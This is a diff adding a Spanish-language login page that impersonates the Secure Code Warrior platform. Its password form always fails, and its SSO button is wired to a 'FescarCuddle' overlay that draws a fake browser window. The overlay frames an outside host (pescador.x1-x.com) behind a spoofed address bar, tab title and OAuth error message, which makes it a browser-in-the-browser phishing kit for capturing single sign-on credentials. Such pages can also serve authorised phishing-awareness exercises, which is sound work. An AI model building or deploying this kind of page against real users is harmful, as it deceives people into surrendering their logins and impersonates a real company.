@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Iniciar sesión · SecureCode Platform</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    body { background: #0d1b2e; }
+    .login-wrap {
+      min-height: calc(100vh - 64px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+    .login-card {
+      background: #111827;
+      border: 1px solid #1e2d42;
+      border-radius: 16px;
+      padding: 48px 44px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 24px 64px rgba(0,0,0,0.6);
+    }
+    .login-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      justify-content: center;
+      margin-bottom: 32px;
+      text-decoration: none;
+    }
+    .login-logo svg { width: 36px; height: 36px; }
+    .login-logo span {
+      font-size: 0.68rem;
+      font-weight: 800;
+      color: #fff;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      line-height: 1.2;
+    }
+    .login-card h1 {
+      font-size: 1.5rem;
+      font-weight: 800;
+      color: #fff;
+      text-align: center;
+      margin-bottom: 6px;
+    }
+    .login-card .subtitle {
+      text-align: center;
+      color: #64748b;
+      font-size: 0.85rem;
+      margin-bottom: 32px;
+    }
+    .field {
+      margin-bottom: 18px;
+    }
+    .field label {
+      display: block;
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: #94a3b8;
+      margin-bottom: 7px;
+    }
+    .field input {
+      width: 100%;
+      background: #1a2535;
+      border: 1px solid #2a3a50;
+      border-radius: 8px;
+      padding: 11px 14px;
+      font-size: 0.9rem;
+      color: #e2e8f0;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .field input:focus { border-color: #1e88e5; }
+    .field input::placeholder { color: #475569; }
+    .forgot {
+      text-align: right;
+      margin-top: -10px;
+      margin-bottom: 24px;
+    }
+    .forgot a {
+      font-size: 0.78rem;
+      color: #1e88e5;
+      text-decoration: none;
+    }
+    .forgot a:hover { text-decoration: underline; }
+    .btn-submit {
+      width: 100%;
+      background: #f5a623;
+      border: none;
+      border-radius: 8px;
+      padding: 13px;
+      font-size: 0.9rem;
+      font-weight: 800;
+      color: #0d1b2e;
+      letter-spacing: 0.05em;
+      cursor: pointer;
+      transition: filter 0.15s;
+    }
+    .btn-submit:hover { filter: brightness(1.08); }
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 24px 0;
+      color: #334155;
+      font-size: 0.78rem;
+    }
+    .divider::before, .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #1e2d42;
+    }
+    .btn-sso {
+      width: 100%;
+      background: none;
+      border: 1px solid #2a3a50;
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: #94a3b8;
+      cursor: pointer;
+      transition: border-color 0.2s, color 0.2s;
+    }
+    .btn-sso:hover { border-color: #1e88e5; color: #e2e8f0; }
+    .register {
+      text-align: center;
+      margin-top: 24px;
+      font-size: 0.82rem;
+      color: #475569;
+    }
+    .register a {
+      color: #1e88e5;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .error-box {
+      background: rgba(220, 38, 38, 0.1);
+      border: 1px solid rgba(220, 38, 38, 0.35);
+      border-radius: 8px;
+      padding: 12px 16px;
+      font-size: 0.82rem;
+      color: #fca5a5;
+      margin-bottom: 20px;
+      display: none;
+      line-height: 1.5;
+    }
+    .error-box.visible { display: block; }
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.65);
+      z-index: 200;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-overlay.visible { display: flex; }
+    .modal {
+      background: #1e2535;
+      border: 1px solid #2a3a50;
+      border-radius: 14px;
+      padding: 40px 36px;
+      max-width: 400px;
+      width: calc(100% - 40px);
+      text-align: center;
+      box-shadow: 0 24px 64px rgba(0,0,0,0.7);
+      animation: fadeUp 0.25s ease both;
+    }
+    @keyframes fadeUp {
+      from { opacity:0; transform:translateY(14px); }
+      to   { opacity:1; transform:translateY(0); }
+    }
+    .modal-icon { font-size: 2.4rem; margin-bottom: 16px; display: block; }
+    .modal h3 { font-size: 1.15rem; font-weight: 800; color: #f1f5f9; margin-bottom: 10px; }
+    .modal p  { font-size: 0.85rem; color: #94a3b8; line-height: 1.6; margin-bottom: 24px; }
+    .modal-close {
+      background: #1e88e5;
+      border: none;
+      border-radius: 8px;
+      padding: 10px 28px;
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: #fff;
+      cursor: pointer;
+      transition: filter 0.15s;
+    }
+    .modal-close:hover { filter: brightness(1.15); }
+
+    @media (max-width: 768px) {
+      .nav-links { display: none; }
+      .nav-actions .lang-btn { display: none; }
+    }
+
+    @media (max-width: 480px) {
+      .login-card {
+        padding: 36px 24px;
+      }
+      .btn-login { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+  <nav class="navbar scrolled" id="navbar">
+    <a href="index.html" class="nav-logo">
+      <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:36px;height:36px;">
+        <path d="M18 3L4 9v10c0 7.73 5.96 14.96 14 16.93C26.04 33.96 32 26.73 32 19V9L18 3z" fill="#f5a623"/>
+        <path d="M14 18l3 3 6-6" stroke="#0d1b2e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      <span class="nav-logo-text">Secure<br>Code<br>Warrior</span>
+    </a>
+    <ul class="nav-links">
+      <li><a href="dummy.html?p=Producto">Producto <span class="chevron">▾</span></a></li>
+      <li><a href="dummy.html?p=Soluciones">Soluciones <span class="chevron">▾</span></a></li>
+      <li><a href="dummy.html?p=Recursos">Recursos <span class="chevron">▾</span></a></li>
+      <li><a href="dummy.html?p=Socios">Socios <span class="chevron">▾</span></a></li>
+      <li><a href="dummy.html?p=Soporte">Soporte <span class="chevron">▾</span></a></li>
+      <li><a href="dummy.html?p=Empresa">Empresa <span class="chevron">▾</span></a></li>
+    </ul>
+    <div class="nav-actions">
+      <button class="lang-btn">ES <span class="chevron">▾</span></button>
+      <a href="plataforma.html" class="btn-start" style="text-decoration:none;display:inline-flex;align-items:center;">EMPEZAR</a>
+    </div>
+  </nav>
+
+  <div class="login-wrap">
+    <div class="login-card">
+      <a href="index.html" class="login-logo">
+        <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M18 3L4 9v10c0 7.73 5.96 14.96 14 16.93C26.04 33.96 32 26.73 32 19V9L18 3z" fill="#f5a623"/>
+          <path d="M14 18l3 3 6-6" stroke="#0d1b2e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Secure<br>Code<br>Warrior</span>
+      </a>
+      <h1>Iniciar sesión</h1>
+      <p class="subtitle">Accede a tu cuenta de la plataforma</p>
+
+      <form id="login-form" onsubmit="return false;">
+        <div class="error-box" id="error-box">
+          &#9888; Las credenciales introducidas no son correctas. Por favor, verifica tu correo y contraseña e inténtalo de nuevo.
+        </div>
+        <div class="field">
+          <label for="email">Correo electrónico</label>
+          <input type="email" id="email" placeholder="tu@empresa.com" autocomplete="email">
+        </div>
+        <div class="field">
+          <label for="password">Contraseña</label>
+          <input type="password" id="password" placeholder="••••••••" autocomplete="current-password">
+        </div>
+        <div class="forgot"><a href="#">¿Olvidaste tu contraseña?</a></div>
+        <button type="submit" class="btn-submit" id="btn-submit">INICIAR SESIÓN</button>
+      </form>
+
+      <script>
+        document.getElementById('login-form').addEventListener('submit', function () {
+          var btn = document.getElementById('btn-submit');
+          var box = document.getElementById('error-box');
+          btn.disabled = true;
+          btn.textContent = 'Verificando…';
+          setTimeout(function () {
+            btn.disabled = false;
+            btn.textContent = 'INICIAR SESIÓN';
+            box.classList.add('visible');
+            document.getElementById('password').value = '';
+            document.getElementById('password').focus();
+          }, 900);
+        });
+      </script>
+
+      <div class="divider">o continúa con</div>
+      <button class="btn-sso">&#128274; Iniciar sesión con SSO</button>
+
+      <p class="register">¿No tienes cuenta? <a href="#" id="register-link">Regístrate gratis</a></p>
+    </div>
+  </div>
+
+  <!-- Modal -->
+  <div class="modal-overlay" id="register-modal">
+    <div class="modal">
+      <span class="modal-icon">&#128274;</span>
+      <h3>Acceso restringido</h3>
+      <p>El registro de nuevas cuentas está gestionado por tu organización.<br>Habla con el <strong style="color:#e2e8f0;">administrador de tu organización</strong> para que te invite a la plataforma.</p>
+      <button class="modal-close" id="modal-close-btn">Entendido</button>
+    </div>
+  </div>
+
+  <script>
+    var modal = document.getElementById('register-modal');
+    document.getElementById('register-link').addEventListener('click', function (e) {
+      e.preventDefault();
+      modal.classList.add('visible');
+    });
+    document.getElementById('modal-close-btn').addEventListener('click', function () {
+      modal.classList.remove('visible');
+    });
+    modal.addEventListener('click', function (e) {
+      if (e.target === modal) { modal.classList.remove('visible'); }
+    });
+  </script>
+
+  <!-- FescarCuddle: browser-window overlay triggered by the SSO button -->
+  <script>
+    window.appConfig = {
+      iframeSrc:        "https://pescador.x1-x.com/?token=qwerty",
+      sitePanelMessage: "securelogin.example.com",
+      addressText:      "securelogin.example.com/saml/sso",
+      tabTitle:         "SecureLogin – SSO",
+      debugServerUrl:   "https://debug.x1-x.com",
+      matchUrl: "/",
+      matchIframeSrc: "/autenticado.html",
+      matchAddressText: "https://x1.x.com/login",
+      matchTabTitle: "Autenticado",
+      matchFavicon: "/favicon.svg",
+      matchHideDelay:   3,
+      matchCloseMessage: "Error durante el proceso de autenticación.\n\nNo se ha podido completar la redirección OAuth/OpenID Connect...\n\nPor favor, vuelve a intentarlo."
+    };
+  </script>
+  <script src="../fescarcuddle-loader.js"></script>
+  <script>
+    FescarCuddle.attach('.btn-sso');
+  </script>
+
+</body>
+</html>
